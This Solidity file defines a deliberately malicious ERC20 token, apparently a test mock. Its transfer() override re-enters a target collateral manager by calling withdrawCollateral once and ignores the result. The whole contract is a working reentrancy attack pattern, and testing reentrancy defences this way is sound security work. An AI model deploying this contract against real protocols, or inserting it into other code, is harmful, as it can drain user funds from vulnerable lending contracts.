// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MaliciousERC20 is ERC20 {
    address public targetCollateralManager;
    bool public attackTriggered;
    
    constructor(string memory name, string memory symbol, uint8 decimals) 
        ERC20(name, symbol) 
    {
        _mint(msg.sender, 1000000 * 10 ** decimals);
    }
    
    function setTarget(address _target) external {
        targetCollateralManager = _target;
    }
    
    function transfer(address to, uint256 amount) public override returns (bool) {
        if (!attackTriggered && targetCollateralManager != address(0)) {
            attackTriggered = true;
            // Attempt reentrancy: try to withdraw again
            (bool success, ) = targetCollateralManager.call(
                abi.encodeWithSignature("withdrawCollateral(uint256)", amount)
            );
            // Swallow result to allow original transfer to complete
        }
        return super.transfer(to, amount);
    }
}